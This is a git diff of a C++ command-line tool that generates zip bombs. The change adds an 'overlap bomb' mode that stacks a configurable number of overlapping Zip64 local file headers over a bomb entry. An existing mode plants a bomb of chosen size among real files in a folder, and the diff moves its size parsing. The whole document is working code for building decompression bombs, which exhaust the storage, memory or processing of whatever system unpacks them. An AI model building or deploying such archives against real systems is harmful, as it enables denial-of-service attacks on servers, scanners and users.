@@ -18,23 +18,25 @@ namespace {
         TB = GB * 1024,
         PB = TB * 1024
     };
-}
 
-std::optional<size_t> parseBombSize(const std::optional<std::string> &sizeInString, ByteSizeBaseKB byteSize) {
-    if (!sizeInString) return std::nullopt;
+    std::optional<size_t> parseBombSize(const std::optional<std::string> &sizeInString, ByteSizeBaseKB byteSize) {
+        if (!sizeInString) return std::nullopt;
 
-    size_t size{};
+        size_t size{};
 
-    auto [ptr, ec] = std::from_chars(sizeInString.value().data(),
-                                     sizeInString.value().data() + sizeInString.value().size(), size);
-    if (ec != std::errc{}) {
-        throw std::runtime_error{"Invalid value given for bomb size "};
+        auto [ptr, ec] = std::from_chars(sizeInString.value().data(),
+                                         sizeInString.value().data() + sizeInString.value().size(), size);
+        if (ec != std::errc{}) {
+            throw std::runtime_error{"Invalid value given for bomb size "};
+        }
+
+        size *= static_cast<size_t>(byteSize);
+
+        return size;
     }
-
-    size *= static_cast<size_t>(byteSize);
-
-    return size;
 }
+
+
 
 int main(int argc, const char **argv) {
     Timer totalRuntime{"Total Runtime"};
@@ -50,9 +52,11 @@ int main(int argc, const char **argv) {
     inputParser.registerFlag("mb", "Sets the bomb size in mb followed by the size in number, default is 1gb", true);
     inputParser.registerFlag("gb", "Sets the bomb size in gb followed by the size in number, default is 1gb", true);
     inputParser.registerFlag("tb", "Sets the bomb size in tb followed by the size in number, default is 1gb", true);
-    inputParser.registerFlag("pb", "Sets the bomb size in pb followed by the size in number, default is 1gb", true);
+    // inputParser.registerFlag("pb", "Sets the bomb size in pb followed by the size in number, default is 1gb", true);
     inputParser.registerFlag("name", "Sets the name of the produced zipped file, default is zipBomb.zip", true);
-    inputParser.registerFlag("target", "Sets the target file to the bomb", true);
+    inputParser.registerFlag("target", "Sets the target file to be the bomb file", true);
+    inputParser.registerFlag("overlapName","Sets the name of the overlapping bomb, default is overlapBomb",true);
+    inputParser.registerFlag("overlappingHeaders","Sets how many overlapping headers of the overlap bomb should have, default is 1000",true);
 
     try {
         if (bool parsedOk{inputParser.parse(argc, argv)}; inputParser.containsInputFlag("help") || !parsedOk) {
@@ -65,20 +69,12 @@ int main(int argc, const char **argv) {
         auto inputMbSize{inputParser.getFlagValue("mb")};
         auto inputGbSize{inputParser.getFlagValue("gb")};
         auto inputTbSize{inputParser.getFlagValue("tb")};
-        auto inputPbSize{inputParser.getFlagValue("pb")};
+        // auto inputPbSize{inputParser.getFlagValue("pb")};
         auto inputTargetFile{inputParser.getFlagValue("target")};
-
-
-        std::string zipFileName{inputName.has_value() ? helper::ensureZipExtension(inputName.value()) : "zipBomb.zip"};
+        auto inputOverlapBombName{inputParser.getFlagValue("overlapName")};
+        auto inputOverlappingHeaders{inputParser.getFlagValue("overlappingHeaders")};
 
         std::string folderPath{inputPath.has_value() ? inputPath.value() : fs::current_path().string()};
-
-        size_t bombSize{(static_cast<size_t>(ByteSizeBaseKB::GB) * 1)};
-
-        if (auto size{parseBombSize(inputMbSize, ByteSizeBaseKB::MB)})bombSize = size.value();
-        if (auto size{parseBombSize(inputGbSize, ByteSizeBaseKB::GB)})bombSize = size.value();
-        if (auto size{parseBombSize(inputTbSize, ByteSizeBaseKB::TB)})bombSize = size.value();
-        if (auto size{parseBombSize(inputPbSize, ByteSizeBaseKB::PB)})bombSize = size.value();
 
         std::vector<fs::path> files;
         for (const auto &entry: fs::recursive_directory_iterator(folderPath,
@@ -88,11 +84,12 @@ int main(int argc, const char **argv) {
             }
         }
 
-
         if (files.empty()) {
             std::cout << "No files found in " << folderPath << '\n';
             return 0;
         }
+
+        std::string zipFileName{inputName.has_value() ? helper::ensureZipExtension(inputName.value()) : "zipBomb.zip"};
 
         ZipFile zipFile{zipFileName};
 
@@ -114,10 +111,21 @@ int main(int argc, const char **argv) {
 
         size_t nthFileRead{};
 
+        size_t bombSize{(static_cast<size_t>(ByteSizeBaseKB::GB) * 1)};
+
+        if (auto size{parseBombSize(inputMbSize, ByteSizeBaseKB::MB)})bombSize = size.value();
+        if (auto size{parseBombSize(inputGbSize, ByteSizeBaseKB::GB)})bombSize = size.value();
+        if (auto size{parseBombSize(inputTbSize, ByteSizeBaseKB::TB)})bombSize = size.value();
+        // if (auto size{parseBombSize(inputPbSize, ByteSizeBaseKB::PB)})bombSize = size.value();
+
+        bool hasOverlapBomb{inputOverlapBombName.has_value() || inputOverlappingHeaders.has_value()};
+
+        zipFile.cdAddCapacity(files.size());
+
         for (const fs::path &entry: files) {
             std::string fileName{fs::relative(entry, folderPath).generic_string()};
 
-            if (nthFileRead == bombPlacement) {
+            if (nthFileRead == bombPlacement && !hasOverlapBomb) {
                 Timer readFileTimer{"Placing Bomb in File - " + fileName};
                 LocalFileHeader bombFile{
                     LocalFileHeader::createBomb(fileName, bombSize)
@@ -130,6 +138,38 @@ int main(int argc, const char **argv) {
                 zipFile.addFile(compressedFileHeader);
             }
             ++nthFileRead;
+        }
+
+        if (hasOverlapBomb) {
+            std::string overLapBombFolderName {inputOverlapBombName.has_value()? inputOverlapBombName.value() : "overlapBomb"};
+            size_t overLappingHeaders{1000};
+
+            Timer overlapBombTimer{"Creating overlap bomb - " + overLapBombFolderName};
+
+            if (inputOverlappingHeaders.has_value()) {
+                auto [ptr, ec] = std::from_chars(inputOverlappingHeaders.value().data(),
+                                        inputOverlappingHeaders.value().data() + inputOverlappingHeaders.value().size(), overLappingHeaders);
+                if (ec != std::errc{}) {
+                    throw std::runtime_error{"Invalid value given for bomb size "};
+                }
+            }
+
+            UniqueNameGenerator uniqueNameGenerator{overLappingHeaders,(std::move(overLapBombFolderName))};
+            std::vector<LocalFileHeader> overlappingLocalFileHeaders;
+            overlappingLocalFileHeaders.reserve(overLappingHeaders);
+
+            overlappingLocalFileHeaders.push_back( LocalFileHeader::createBomb("kernel", bombSize));
+
+            for (size_t i {0}; i < overLappingHeaders; ++i) {
+                overlappingLocalFileHeaders.push_back(LocalFileHeader::createNonFinalZip64(uniqueNameGenerator, overlappingLocalFileHeaders[i]));
+
+            }
+
+            zipFile.cdAddCapacity(overLappingHeaders);
+
+            for (size_t i {overlappingLocalFileHeaders.size()-1}; i > 0; --i) {
+                zipFile.addFile(overlappingLocalFileHeaders[i]);
+            }
         }
 
         {
